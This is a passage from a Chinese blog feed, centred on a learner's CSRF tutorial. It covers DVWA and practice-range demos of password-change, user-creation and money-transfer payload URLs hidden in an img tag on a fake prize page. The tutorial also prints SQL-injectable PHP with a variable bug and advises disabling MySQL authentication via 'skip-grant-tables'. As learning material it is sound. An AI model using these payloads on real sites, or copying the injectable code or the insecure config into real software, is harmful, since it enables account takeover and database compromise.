src="https://img-blog.csdnimg.cn/20200808182023749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>脑洞太小啊。</p><p>如果觉得写的不错的话，请我吃个糖？<a href="https://zxcv0221.github.io/about/">传送门</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF(跨站请求伪造)学习与理解</title>
      <link href="/2020/08/23/CSRF(%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%90%86%E8%A7%A3/"/>
      <url>/2020/08/23/CSRF(%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>发现团队里的同学进步都好快啊。我快要跟不上了，一直在做题，只能做动一些杂项和密码学的简单题，思路多少掌握一点，但是我学Web的，不会做Web题，现在还做不动简单题。有点发愁。做题暂时做不进去了，学点新东西缓解下疲劳。这次主要学习一下CSRF。并写下自己的学习过程和学习中对此知识的见解。</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="首先了解一下什么是CSRF。"><a href="#首先了解一下什么是CSRF。" class="headerlink" title="首先了解一下什么是CSRF。"></a>首先了解一下什么是CSRF。</h2><p>CSRF也叫跨站请求伪造。</p><blockquote><p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p></blockquote><h2 id="攻击方式和危害"><a href="#攻击方式和危害" class="headerlink" title="攻击方式和危害"></a>攻击方式和危害</h2><blockquote><p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。<br>由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。<br>这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。<br>从这里可以看出：<br>攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户的浏览器，让其以用户的名义运行操作。</p></blockquote><p>以上是维基百科内容:我个人认为讲述比较清晰，也易懂，于是就摘抄过来了。然后我就再说说我自己学习时的理解。<br>危害大概有，修改用户密码进行恶意登录、恶意转账、以受害者名义发送邮件，发消息，盗取受害者的账号，甚至购买商品，虚拟货币转账，修改受害者的网络配置。就是正常用户能使用这个账号进行什么操作，攻击者都能做。</p><h2 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h2><p>1.<strong>网站信任浏览器</strong>：受害者浏览过一个网页后，会在浏览器上保存有记录，而攻击者就是通过一些方法用受害者的浏览器，去访问受害者之前访问过并且保留有信息的网页。就拿我的电脑为例：我的电脑是登录并认证了CSDN的，所以我每次登录CSDN都不需要再次输入账户密码或者扫码什么的方式进入CSDN。到那时换个浏览器(比如用火狐)，他还是会让我登录。这个就会有个问题，这样的话，CSDN是怎么辨别就是我登录的呢，这里就是上面提到的<strong>网站对用户浏览器的信任</strong>，所以在原来认证过的浏览器登录，网站会认为就是这个用户在使用。就直接同意使用该浏览器的人进入这个账户了。像我的CSDN，如果让我的朋友使用的话，他就可以直接进入我的CSDN账号，并做任何我的账户所能做的事。**(这是个人理解，如有不对的地方，还请各位大佬指点。)**</p><p>2.<strong>攻击</strong>：CSRF攻击分两种，一种是get型一种是post型。<br>首先get类型简单说明，用户修改密码的界面的URL被攻击者通过某种方式得到了，然后攻击者修改了这个URL(修改成他自己知道的密码)再次发给用户，(其过程可以将URL做一下伪装)然后用户点击，修改密码成功，攻击者就可以使用浏览器登录用户的账号进行操作(此时的密码已经是攻击者知道的那个密码了)。<br>自己理解过漏洞后，在靶场练习一下。<br>3.CSRF漏洞代码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="comment">//会话验证</span></span><br><span class="line">     $user = $_GET[<span class="string">&quot;user&quot;</span>];</span><br><span class="line">     $money = $_GET[<span class="string">&quot;money&quot;</span>];</span><br><span class="line">     <span class="comment">//转账操作</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由此可以看出，CSRF成功利用的条件<br>一、用户已经登录系统<br>二、用户访问对应URL</p><h2 id="靶场实验"><a href="#靶场实验" class="headerlink" title="靶场实验"></a>靶场实验</h2><p>靶场环境是DVWA</p><h4 id="本地靶场实验原理"><a href="#本地靶场实验原理" class="headerlink" title="本地靶场实验原理"></a>本地靶场实验原理</h4><p>登录靶场<br><img src="https://img-blog.csdnimg.cn/20200425105939177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>上面这个是在安全等级为impossible的程度下，可以看出修改密码的话要输入原密码的，这也是目前大多数网站的做法。奥这我就懂了，原来修改密码前输入原密码是为了防止CSRF攻击。</p><p>现在调到low级别的<br><img src="https://img-blog.csdnimg.cn/20200425110248920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看出，这个安全等级不需要输入原密码。修改一下密码，此刻充当受害者。<br><img src="https://img-blog.csdnimg.cn/20200425110838131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里显示修改成功，URL是这样的，复制一下，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>我做一下修改(此时我是攻击者)，将这个URL改的密码修改成我要的密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=zxcv0221&amp;password_conf=zxcv0221&amp;Change=Change<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200425111450916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>修改成功，当然我这是实验，受害人(我)比较傻，直接点了。<br>伪装的话，可以通过短网址生成，和简单的html来进行伪装。<br>我在靶机上构成的本地网址是没办法生成短网址的，就是<code>127.0.0.1</code>这样的都没办法生成。所以就不放图了。<br>然后就可以通过攻击者修改的密码，来进行登录了。</p><h3 id="get类型"><a href="#get类型" class="headerlink" title="get类型"></a>get类型</h3><p>get型CSRF利用，就是构造get型URL，提交username和password参数，新建一个对应的用户名和密码。<br>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;phpdemo&#x2F;1.php?username&#x3D;j4y&amp;password&#x3D;j4y</span><br></pre></td></tr></table></figure><p>这是一个添加用户的URL，将它发送给管理员，管理员点击后就会添加这么一个用户。<br>当然，这样太明显，可以放在img标签的src属性里。这是隐蔽利用。</p><h4 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h4><p>下面一个测试CSRF的代码，可以自己试一下。(在网上找的本地靶场代码)<br><img src="https://img-blog.csdnimg.cn/20200504152248764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>代码前面要连接数据库，本地mysql的用户名和密码都要输进去。<br>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">$username = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$conn = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">$db=mysql_select_db(<span class="string">&quot;csrf_test&quot;</span>);</span><br><span class="line">$query = mysql_query(<span class="string">&quot;SET NAMES &#x27;gbk&#x27;&quot;</span>);</span><br><span class="line">$sql=<span class="string">&quot;INSERT INTO `test` (`username` ,`password`)VALUES (&#x27;$username&#x27; ,&#x27;$password&#x27;)&quot;</span>;</span><br><span class="line">$row=mysql_query($sql);<span class="comment">//执行sql插入语句</span></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM test&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($row=mysql_query($sql))&#123;</span><br><span class="line"><span class="keyword">while</span> ($row = mysql_fetch_array($row))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;user:&#123;$rows[&#x27;username&#x27;]&#125;-----pass:&#123;$rows[&#x27;password&#x27;]&#125;&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;CSRF测试平台&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;b&gt;&lt;h2&gt;GET型 CSRF&lt;/h2&gt;&lt;/b&gt;</span><br><span class="line">&lt;p&gt;需要GET提交 username  password&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>需要自己修改一下，改成和自己的配置能连接到一起的，直接复制代码可能会出错。</strong><br>发现跑出来是这个样子。<br><img src="https://img-blog.csdnimg.cn/20200504141823825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>于是上网查解决办法，发现是php连接mysql<br>报错，原因是权限问题，root帐户默认不开放远程访问权限，所以需要修改一下相关权限。<br>解决办法是<br>打开MySQL目录下的my.ini文件，在文件的最后添加一行“skip-grant-tables”，保存并关闭文件。<br>如果正常了，那很幸运，如果还是有报错，(截图忘存了)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notice: Undefined index: username in D:\phpStudy\PHPTutorial\WWW\phpdemo\<span class="number">1.</span>php on line <span class="number">3</span></span><br></pre></td></tr></table></figure><p>这样的报错，就在代码最上方，加一行<br><code> error_reporting(E_ALL ^ E_NOTICE);</code><br>解决后，终于正常了。<br><img src="https://img-blog.csdnimg.cn/20200504151318912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后将代码隐藏在一个img标签中，这么写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>中奖了<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>中奖了<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/phpdemo/1.php?username=admin_test&amp;password=admin_test&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问，然后出像这样的页面。<br><img src="https://img-blog.csdnimg.cn/20200504152001140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个就已经成功了。（下面这张图是教程上的图，因为我是在虚拟机里做的，做完实验之后，就直接恢复快照了，也没有截图，这个是复现的。也懒得再配置了，显示结果，就直接用教程上的图了。）<br><img src="https://img-blog.csdnimg.cn/20200504152125836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h4 id="在线靶场实验恶意转账"><a href="#在线靶场实验恶意转账" class="headerlink" title="在线靶场实验恶意转账"></a>在线靶场实验恶意转账</h4><p><img src="https://img-blog.csdnimg.cn/20200425114655494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>已经转了10元钱给admin这个账户。<br>看下payload，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.nanhack.com/payload/xss/csrf1.php?name=admin&amp;money=10</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200425114838602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>修改payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.nanhack.com/payload/xss/csrf1.php?name=feiwu&amp;money=100</span><br></pre></td></tr></table></figure><p>嗯，好了，我决定转给feiwu100块钱，这个名字我喜欢。<br><img src="https://img-blog.csdnimg.cn/20200425115124201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后我就发现我的账户上钱少了，<br><img src="https://img-blog.csdnimg.cn/20200425115413923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个时候，feiwu的账户上就会多了100，我转给他的。</p><p>直接构造CSRF链接，成功率贼低。可以用HTML的一些方法进行伪装一下。比如可以将连接隐藏在图片里。</p><h3 id="post类型"><a href="#post类型" class="headerlink" title="post类型"></a>post类型</h3><h4 id="post型CSRF利用"><a href="#post型CSRF利用" class="headerlink" title="post型CSRF利用"></a>post型CSRF利用</h4><p>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单。<br>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。<br>可以利用一个简单的CSRFform表单提交设置一下。<br><img src="https://img-blog.csdnimg.cn/2020050415075529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;sub&#x27;</span>])) &#123;</span><br><span class="line">$username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$conn = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">$db = mysql_select_db(<span class="string">&quot;csrf_test&quot;</span>);</span><br><span class="line">$query = mysql_query(<span class="string">&quot;SET NAMES &#x27;gbk&#x27;&quot;</span>);</span><br><span class="line">$sql = <span class="string">&quot;INSERT INTO `test` (`username` , `password`)VALUES (&#x27;$username&#x27; , &#x27;$password&#x27;)&quot;</span>;</span><br><span class="line">$row=mysql_query($sql);</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM test&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ($row=mysql_query($sql))&#123;</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($row))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;user:&#123;$rows[&#x27;username&#x27;]&#125;-----pass:&#123;$rows[&#x27;password&#x27;]&#125;&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;CSRF利用场所&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;b&gt;user:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;&lt;/b&gt;</span><br><span class="line">    &lt;b&gt;pass:&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;&lt;/b&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;OK&quot;</span> name=<span class="string">&quot;sub&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200504152521283.png" alt="在这里插入图片描述" loading="lazy"><br>报错什么的基本在get类型的代码上解决完了，这个直接<br><img src="https://img-blog.csdnimg.cn/20200504153101827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200504153139137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>点击“我要中奖了”，就成功了。<br><img src="https://img-blog.csdnimg.cn/20200504153307613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++超市库存管理系统期末作业</title>
      <link href="/2020/08/23/C++%E8%B6%85%E5%B8%82%E5%BA%93%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E4%BD%9C%E4%B8%9A/"/>
      <url>/2020/08/23/C++%E8%B6%85%E5%B8%82%E5%BA%93%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>期末前的一个作业，忙了好久才做好，真是要吐了。<br>下面是个流程图，相关功能我写的还算清晰，最后还加上了按任意键继续的代码和清屏代码。只是，还没有修改商品的功能，做了这些已经快要废了。还有考试，不做了不做了。就先这样子吧。百度的我都快吐了，看代码，查代码，写代码，从这点看出来我以后可能不适合做开发。哈哈。不说了不说了，考试真的慌啊。狗头保命。<br><img src="https://img-blog.csdnimg.cn/20200610192009667.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span 